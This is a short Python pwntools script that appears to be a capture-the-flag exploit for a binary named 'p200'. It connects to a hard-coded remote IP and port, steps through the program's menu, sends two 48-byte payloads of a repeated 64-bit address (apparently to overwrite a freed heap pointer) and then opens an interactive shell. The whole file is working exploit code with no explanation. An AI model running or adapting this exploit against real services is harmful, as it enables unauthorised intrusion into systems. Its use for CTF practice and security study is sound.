#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 0

if local:
	cn = process('./p200')
	bin = ELF('./p200')
else:
	cn = remote('106.75.8.58', 12333)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

cn.recvuntil('choose')
cn.sendline('3')
cn.recvuntil('choose')
cn.sendline('2')
cn.recvuntil('length')
cn.sendline('48')
sleep(0.2)
cn.sendline(p64(0x0602D50)*6)

cn.recvuntil('choose')
cn.sendline('2')
cn.recvuntil('length')
cn.sendline('48')
sleep(0.2)
cn.sendline(p64(0x0602D50)*6)



cn.interactive()
